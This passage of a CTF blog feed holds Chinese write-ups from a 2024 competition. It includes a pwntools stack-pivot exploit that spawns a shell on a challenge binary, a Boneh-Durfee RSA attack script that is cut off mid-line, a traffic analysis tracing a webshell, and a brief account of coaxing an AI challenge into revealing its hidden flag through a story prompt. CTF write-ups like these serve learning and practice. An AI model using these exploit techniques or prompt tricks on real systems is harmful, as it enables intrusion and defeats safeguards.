b&#x27;q_prob1em!!&#125;&#x27;</span><br></pre></td></tr></table></figure><h1 id="misc"><a class="markdownIt-Anchor" href="#misc">#</a> Misc：</h1><h2 id="givemesecret"><a class="markdownIt-Anchor" href="#givemesecret">#</a> givemesecret：</h2><p>​ai 题，虽然不懂原理，但队友出了，他的方法是先让 ai 编一个故事，是否和 flag 有关我没问他，之后让 ai 显示 flag 即可</p><p><img data-src="https://i-blog.csdnimg.cn/direct/2188fc8e167d4abc8b142f462c81ff30.png#pic_center" alt="在这里插入图片描述"></p><h2 id="master-of-osint"><a class="markdownIt-Anchor" href="#master-of-osint">#</a> Master of OSINT：</h2><p>1. 远处有海，有山，有草，空旷，北方，环海或者环湖公路，青海湖，根据位置去找</p><p>2. 百安居去找</p><p>3. 四川省机场集团航空地面服务有限公司</p><p>4.IKEA 宜家家居附近</p><p>5. 重庆</p><p>6.H 形大厦</p><p><img data-src="https://i-blog.csdnimg.cn/direct/a7a84a502b8243e7b5064e67ea497ef4.jpeg#pic_center" alt="在这里插入图片描述"></p><p>7. 左侧是船，右侧觉华塔，橘子洲游客中心位置</p><p>8. 一个跨海大桥，右侧车道 “长江”</p><p>9. 武汉天兴洲长江大桥中间</p><p><img data-src="https://i-blog.csdnimg.cn/direct/a7aeeaf030df4557ae759a32c4def541.jpeg#pic_center" alt="在这里插入图片描述"></p><p>10. 宏泰百货，然后杭州和深圳都试试，确定为杭州</p><h2 id="签到"><a class="markdownIt-Anchor" href="#签到">#</a> 签到：</h2><p>​flag 再内容里，直接交。</p><h2 id="问卷调查"><a class="markdownIt-Anchor" href="#问卷调查">#</a> 问卷调查：</h2><p>​填写问卷就有 flag。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#web&quot;&gt;#&lt;/a&gt; web：&lt;/h1&gt;
&lt;h2 id=&quot;pyblockly&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#pyblockly&quot;&gt;#&lt;/a</summary>
      
    
    
    
    <category term="CTFer的比赛之路" scheme="http://blog.g01den.top/categories/Game/"/>
    
    
    <category term="Game" scheme="http://blog.g01den.top/tags/Game/"/>
    
  </entry>
  
  <entry>
    <title>网鼎杯2024青龙组官方资格赛wp</title>
    <link href="http://blog.g01den.top/posts/c2860616.html"/>
    <id>http://blog.g01den.top/posts/c2860616.html</id>
    <published>2024-10-31T11:24:37.000Z</published>
    <updated>2024-10-31T11:30:25.281Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwn02"><a class="markdownIt-Anchor" href="#pwn02">#</a> pwn02:</h1><p>** 第一步：**checksec 发现 32 位架构，开了 NX 和 ASLR。</p><p><img data-src="https://i-blog.csdnimg.cn/direct/e15f7f729e9047e280f849d9038d0ef1.png#pic_center" alt="在这里插入图片描述"></p><p>** 第二步：**login 函数有个登陆，账号密码都在里面</p><p><img data-src="https://i-blog.csdnimg.cn/direct/aceb7788569e4b7eba0de8d9a96b1d89.png#pic_center" alt="在这里插入图片描述"></p><p>** 第三步：**vuln 函数存在栈溢出，但是只能溢出 8 个字节，确定位栈迁移。</p><p><img data-src="https://i-blog.csdnimg.cn/direct/0017c348f35141c0b98d0ca1a3382fce.png#pic_center" alt="在这里插入图片描述"></p><p>** 第四步：** 编写脚本，攻击：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./short&quot;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./short&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;0192d5e6064e782f81f9a9fbc9fc041d.0ke5.dg05.ciihw.cn&quot;</span>,<span class="number">45818</span>)</span><br><span class="line"><span class="comment"># io.recvuntil(b&quot;Enter your username: &quot;)</span></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line"><span class="comment"># io.recvuntil(b&quot;Enter your password: &quot;)</span></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&quot;admin123&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;You will input this: &quot;</span>)</span><br><span class="line">add = io.recv(<span class="number">10</span>) </span><br><span class="line"><span class="comment"># print(int(add,16))</span></span><br><span class="line">addr = <span class="built_in">int</span>(add,<span class="number">16</span>)</span><br><span class="line">log.success(<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x080483fa</span></span><br><span class="line">system_addr = elf.plt[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = <span class="number">0x804A038</span></span><br><span class="line">vuln_addr = elf.symbols[<span class="string">&quot;vuln&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload = p32(ret) + p32(system_addr) + p32(ret) + p32(binsh) + p32(binsh)</span><br><span class="line">payload = payload.ljust(<span class="number">80</span>,<span class="string">b&quot;p&quot;</span>) </span><br><span class="line">payload = payload + p32(addr) + p32(<span class="number">0x08048674</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img data-src="https://i-blog.csdnimg.cn/direct/81c4aa9d525f4c158218615d13caf5ce.png#pic_center" alt="在这里插入图片描述"></p><h1 id="misc03"><a class="markdownIt-Anchor" href="#misc03">#</a> misc03：</h1><p>** 第一步：** 打开流量包，根据协议排序发现了两种有用的协议，一个 TCP，一个 HTTP，察觉可能是个网站，然后过滤 HTTP：</p><p><img data-src="https://i-blog.csdnimg.cn/direct/935450027d77434ea760ad654e2da17a.png#pic_center" alt="在这里插入图片描述"></p><p>** 第二步：** 过滤 HTTP 后发现了个疑似危险 ip：39.144.218.183，有爆破目录的可能：</p><p><img data-src="https://i-blog.csdnimg.cn/direct/524d347f90dd4aa4a123c2b543563c9c.png#pic_center" alt="在这里插入图片描述"></p><p>** 第三步：** 根据很多请求响应对，发现很多都是 404，404 的状态长度比较短，根据 Length 排序，从最大的和最小的开始选，找出与众不同的一批流量，发现了木马和访问木马的 ip：</p><p><img data-src="https://i-blog.csdnimg.cn/direct/9ccd78a6d5c34c029ee82a85965bedb1.png#pic_center" alt="在这里插入图片描述"></p><p>** 第四步：** 跟踪这个流，发现了危险的 payload，确定这个就是攻击者：<br><img data-src="https://i-blog.csdnimg.cn/direct/6da17fb87b4d4daebf6d6a8a81a7fe50.png#pic_center" alt="在这里插入图片描述"></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wdflag&#123;39.168.5.60&#125;</span><br></pre></td></tr></table></figure><h1 id="crypto01"><a class="markdownIt-Anchor" href="#crypto01">#</a> crypto01：</h1><p>​原题，直接上 https://www.cnblogs.com/mumuhhh/p/17789591.html，有个脚本，改一下，具体参数之后直接 sagemath 跑：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line">time.clock = time.time</span><br><span class="line"> </span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line"> </span><br><span class="line">strict = <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">helpful_only = <span class="literal">True</span></span><br><span class="line">dimension_min = <span class="number">7</span> <span class="comment"># 如果晶格达到该尺寸，则停止移除</span></span><br><span class="line"><span class="comment"># 显示有用矢量的统计数据</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">helpful_vectors</span>(<span class="params">BB, modulus</span>):</span><br><span class="line">    nothelpful = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> BB[ii,ii] &gt;= modulus:</span><br><span class="line">            nothelpful += <span class="number">1</span></span><br><span class="line">            </span><br><span class="line">    <span class="built_in">print</span> (nothelpful, <span class="string">&quot;/&quot;</span>, BB.dimensions()[<span class="number">0</span>], <span class="string">&quot; vectors are not helpful&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示带有 0 和 X 的矩阵</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">matrix_overview</span>(<span class="params">BB, bound</span>):</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">&#x27;%02d &#x27;</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> BB[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;X&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>: </span><br><span class="line">                a += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span class="string">&#x27;~&#x27;</span></span><br><span class="line">        <span class="comment">#print (a)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试删除无用的向量</span></span><br><span class="line"><span class="comment"># 从当前 = n-1（最后一个向量）开始</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove_unhelpful</span>(<span class="params">BB, monomials, bound, current</span>):</span><br><span class="line">    <span class="comment"># 我们从当前 = n-1（最后一个向量）开始</span></span><br><span class="line">    <span class="keyword">if</span> current == -<span class="number">1</span> <span class="keyword">or</span> BB.dimensions()[<span class="number">0</span>] &lt;= dimension_min:</span><br><span class="line">        <span class="keyword">return</span> BB</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 开始从后面检查</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(current, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="comment">#  如果它没有用</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            affected_vectors = <span class="number">0</span></span><br><span class="line">            affected_vector_index = <span class="number">0</span></span><br><span class="line">             <span class="comment"># 让我们检查它是否影响其他向量</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(ii + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                <span class="comment"># 如果另一个向量受到影响：</span></span><br><span class="line">                <span class="comment"># 我们增加计数</span></span><br><span class="line">                <span class="keyword">if</span> BB[jj, ii] != <span class="number">0</span>:</span><br><span class="line">                    affected_vectors += <span class="number">1</span></span><br><span class="line">                    affected_vector_index = jj</span><br><span class="line"> </span><br><span class="line">            <span class="comment"># 等级：0</span></span><br><span class="line">            <span class="comment"># 如果没有其他载体最终受到影响</span></span><br><span class="line">            <span class="comment"># 我们删除它</span></span><br><span class="line">            <span class="keyword">if</span> affected_vectors == <span class="number">0</span>:</span><br><span class="line">                <span class="comment">#print (&quot;* removing unhelpful vector&quot;, ii)</span></span><br><span class="line">                BB = BB.delete_columns([ii])</span><br><span class="line">                BB = BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> BB</span><br><span class="line"> </span><br><span class="line">           <span class="comment"># 等级：1</span></span><br><span class="line">            <span class="comment">#如果只有一个受到影响，我们会检查</span></span><br><span class="line">            <span class="comment"># 如果它正在影响别的向量</span></span><br><span class="line">            <span class="keyword">elif</span> affected_vectors == <span class="number">1</span>:</span><br><span class="line">                affected_deeper = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(affected_vector_index + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                    <span class="comment"># 如果它影响哪怕一个向量</span></span><br><span class="line">                    <span class="comment"># 我们放弃这个</span></span><br><span class="line">                    <span class="keyword">if</span> BB[kk, affected_vector_index] != <span class="number">0</span>:</span><br><span class="line">                        affected_deeper = <span class="literal">False</span></span><br><span class="line">                <span class="comment"># 如果没有其他向量受到影响，则将其删除，并且</span></span><br><span class="line">                <span class="comment"># 这个有用的向量不够有用</span></span><br><span class="line">                <span class="comment">#与我们无用的相比</span></span><br><span class="line">                <span class="keyword">if</span> affected_deeper <span class="keyword">and</span> <span class="built_in">abs</span>(bound - BB[affected_vector_index, affected_vector_index]) &lt; <span class="built_in">abs</span>(bound - BB[ii, ii]):</span><br><span class="line">                    <span class="comment">#print (&quot;* removing unhelpful vectors&quot;, ii, &quot;and&quot;, affected_vector_index)</span></span><br><span class="line">                    BB = BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">return</span> BB</span><br><span class="line">    <span class="comment"># nothing happened</span></span><br><span class="line">    <span class="keyword">return</span> BB</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">* 0,0   if it fails</span></span><br><span class="line"><span class="string">* -1，-1 如果 &quot;strict=true&quot;，并且行列式不受约束</span></span><br><span class="line"><span class="string">* x0,y0 the solutions of `pol`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">boneh_durfee</span>(<span class="params">pol, modulus, mm, tt, XX, YY</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Boneh and Durfee revisited by Herrmann and May</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> 在以下情况下找到解决方案：</span></span><br><span class="line"><span class="string">* d &lt; N^delta</span></span><br><span class="line"><span class="string">* |x|&lt; e^delta</span></span><br><span class="line"><span class="string">* |y|&lt; e^0.5</span></span><br><span class="line"><span class="string">每当 delta &lt; 1 - sqrt（2）/2 ~ 0.292</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># substitution (Herrman and May)</span></span><br><span class="line">    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)   <span class="comment">#多项式环</span></span><br><span class="line">    Q = PR.quotient(x*y + <span class="number">1</span> - u)        <span class="comment">#  u = xy + 1</span></span><br><span class="line">    polZ = Q(pol).lift()</span><br><span class="line"> </span><br><span class="line">    UU = XX*YY + <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># x-移位</span></span><br><span class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(mm + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(mm - kk + <span class="number">1</span>):</span><br><span class="line">            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 单项式 x 移位列表</span></span><br><span class="line">    monomials = []</span><br><span class="line">    <span class="keyword">for</span> polynomial <span class="keyword">in</span> gg:</span><br><span class="line">        <span class="keyword">for</span> monomial <span class="keyword">in</span> polynomial.monomials(): <span class="comment">#对于多项式中的单项式。单项式（）：</span></span><br><span class="line">            <span class="keyword">if</span> monomial <span class="keyword">not</span> <span class="keyword">in</span> monomials:  <span class="comment"># 如果单项不在单项中</span></span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># y-移位</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)</span><br><span class="line">            yshift = Q(yshift).lift()</span><br><span class="line">            gg.append(yshift) <span class="comment"># substitution</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 单项式 y 移位列表</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            monomials.append(u^kk * y^jj)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 构造格 B</span></span><br><span class="line">    nn = <span class="built_in">len</span>(monomials)</span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">        BB[ii, <span class="number">0</span>] = gg[ii](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, ii + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> monomials[jj] <span class="keyword">in</span> gg[ii].monomials():</span><br><span class="line">                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#约化格的原型</span></span><br><span class="line">    <span class="keyword">if</span> helpful_only:</span><br><span class="line">        <span class="comment">#  #自动删除</span></span><br><span class="line">        BB = remove_unhelpful(BB, monomials, modulus^mm, nn-<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># 重置维度</span></span><br><span class="line">        nn = BB.dimensions()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> nn == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;failure&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>,<span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 检查向量是否有帮助</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        helpful_vectors(BB, modulus^mm)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 检查行列式是否正确界定</span></span><br><span class="line">    det = BB.det()</span><br><span class="line">    bound = modulus^(mm*nn)</span><br><span class="line">    <span class="keyword">if</span> det &gt;= bound:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;We do not have det &lt; bound. Solutions might not be found.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Try with highers m and t.&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            diff = (log(det) - log(bound)) / log(<span class="number">2</span>)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;size det(L) - size e^(m*n) = &quot;</span>, floor(diff))</span><br><span class="line">        <span class="keyword">if</span> strict:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># display the lattice basis</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        matrix_overview(BB, modulus^mm)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#BB = BB.BKZ(block_size=25)</span></span><br><span class="line">    BB = BB.LLL()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;LLL is done!&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 替换向量 i 和 j -&gt;多项式 1 和 2</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;在格中寻找线性无关向量&quot;</span>)</span><br><span class="line">    found_polynomials = <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> pol1_idx <span class="keyword">in</span> <span class="built_in">range</span>(nn - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> pol2_idx <span class="keyword">in</span> <span class="built_in">range</span>(pol1_idx + <span class="number">1</span>, nn):</span><br><span class="line"> </span><br><span class="line">            <span class="comment"># 对于i and j, 构造两个多项式</span></span><br><span class="line"> </span><br><span class="line">            PR.&lt;w,z&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol1 = pol2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">                pol1 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol1_idx, jj] / 